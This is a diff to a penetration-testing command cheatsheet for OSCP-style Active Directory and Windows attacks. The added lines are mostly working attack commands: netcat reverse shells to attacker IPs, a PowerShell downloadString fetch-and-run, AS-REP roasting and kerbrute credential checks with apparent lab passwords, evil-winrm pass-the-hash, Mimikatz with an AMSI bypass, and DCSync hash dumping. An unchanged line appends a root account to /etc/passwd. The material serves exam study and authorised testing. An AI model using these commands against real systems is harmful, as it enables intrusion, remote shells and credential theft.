@@ -16,8 +16,21 @@
 - [Active Directory Pentesting](#active-directory-pentesting)
   - [Enumeration](#enumeration)
     - [Powerview](#powerview)
-   
+
+# Brief Pentest command cheatsheet
+- https://github.com/deo-gracias/oscp/blob/master/pentest_command_cheat_sheet.md
+
 # Initial Access 
+
+## Connection
+```bash
+#attacker
+root@kali:  rlwrap nc -nlvp 666
+#target
+nc -nv 10.10.0.25 666 -e /bin/bash
+nc.exe 192.168.100.113 4444 –e cmd.exe
+
+```
 
 ## Enumeration
 
@@ -58,12 +71,12 @@ wpscan --url http://x.x.x.x -- wordlist /usr/share/wordlists/SecLists/Passwords/
 ### SMB Enumeration
 ```bash
 smbmap -H x.X.X.x
-smbclient -L X.X.X.x
+smbclient -L \\\\X.X.X.x -N
 nmap -- script=smb-check-vulns.nse x.x.x.x
 smbmount //x.x.x.x/share /mnt -o username=xxx,workgroup=xxx
 mount -t cifs //x.x.x.x/share /mnt
 mount -t cifs -o username=xxx,password=xxx //x.x.x.x/share /mnt
-smbclient \\\x.x.x.x\\share
+smbclient \\\\x.x.x.x\\share
 ```
 
 ### SNMP Enumeration
@@ -356,6 +369,7 @@ netsh dump
 
 ### Use Powerup https://github.com/PowerShellEmpire/PowerTools/blob/master/PowerUp/PowerUp.ps1
 ```bash
+# perform quick checks against a Windows machine for any privilege escalation opportunities
 IEX(New-Object Net.Webclient).downloadString('http://x.x.x.x:8000/PowerUp.ps1')
 powershell.exe -nop -exec bypass
 PS C:\> Import-Module .\PowerUp.ps1
@@ -486,6 +500,21 @@ echo hodor::0:0:root:/root:/bin/bash >> /etc/passwd
 ## Enumeration
 - To check local administrators in domain joined machine
 
+### test for a quick No-Preauth win without supplying a username
+```
+GetNPUsers.py Egotistical-bank.local/ -dc-ip 10.10.10.175
+```
+
+### tool to brute force of a valid username based on info collection so far (not unbounded brute force)
+```bash
+kerbrute.py -users ./users.txt -dc-ip 10.10.10.175 -domain Egotistical-bank.local
+```
+
+### test if credentials are valid
+```bash
+kerbrute.py -user 'fsmith' -password 'Thestrokes23' -dc-ip 10.10.10.175 -domain Egotistical-bank.local
+```
+
 ```powershell
 net localgroup Administrators
 ```
@@ -567,6 +596,28 @@ crackmapexec smb 192.168.215.104 -u 'user' -p 'PASS' --lusers
 
 # Get the password policy
 crackmapexec smb 192.168.215.104 -u 'user' -p 'PASS' --pass-pol
+```
+
+### EvilWinRM (used when port 5985 is open)
+```bash
+#grab shell in attacker's kali
+evil-winrm -i 10.10.10.175 -u fsmith -p Thestrokes23
+evil-winrm -i 192.168.1.19 -u administrator -H 32196B56FFE6F45E294117B91A83BF38
+
+#run mimikatz from evil-winrm
+evil-winrm -i 192.168.1.19 -u administrator -p Ignite@987 -s /opt/privsc/powershell
+Bypass-4MSI
+Invoke-Mimikatz.ps1
+Invoke-Mimikatz
+
+#run winPEAS
+evil-winrm -i 192.168.1.19 -u administrator -p Ignite@987 -e /opt/privsc
+Bypass-4MSI
+menu
+Invoke-Binary /opt/privsc/winPEASx64.exe
+
+#upload files
+upload /root/notes.txt .
 ```
 
 ### Bloodhound
@@ -864,7 +915,7 @@ python3 kirbi2john.py /root/pen200/exercise/ad/sgl.kirbi
 impacket-GetNPUsers -dc-ip 192.168.50.70 -request -outputfile hashes.asreproast corp.com/user1
 
 # [KALI] hashcat with option 18200 for AS-REP, to obtain the plaintext password of user who "Do not require Kerberos preauthentication"
-sudo hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
+sudo hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt -r usr/share/hashcat/rules/best64.rule --force
 ```
 #### on windows (use Rubeus)
 ```bash
@@ -877,7 +928,7 @@ sudo hashcat -m 18200 hashes.asreproast2 /usr/share/wordlists/rockyou.txt -r /us
 
 ### Targeted AS-REP roasting
 - condition: cannot identify any AD users with the account option "Do not require Kerberos preauthentication" enabled && notice that we have GenericWrite or GenericAll permissions on another AD user account
-- leveraging "GenericWrite or GenericAll" permissions, we can modify the User Account Control value of the user to not require Kerberos preauthentication
+- leveraging "GenericWrite or GenericAll" permissions, we can modify the User Account Control value of *any* user to not require Kerberos preauthentication
 - Once enabled "Do not require Kerberos preauthentication" of the user, do AS-REP roasting
 - Finally, reset the User Account Control value of the user once we’ve obtained the AS-REP hash
 
@@ -893,8 +944,9 @@ mimikatz # lsadump::dcsync /user:corp\*targetusertoobtaincredential*
 
 #### DCSync on Kali
 ```bash
-#192.168.50.70 = IP of Domain Controller
+#192.168.50.70 = IP of Domain Controller, output is the hash of target user
 impacket-secretsdump -just-dc-user *targetuser* corp.com/jeffadmin:"BrouhahaTungPerorateBroom2023\!"@192.168.50.70
+
 ```
 
 # MISC
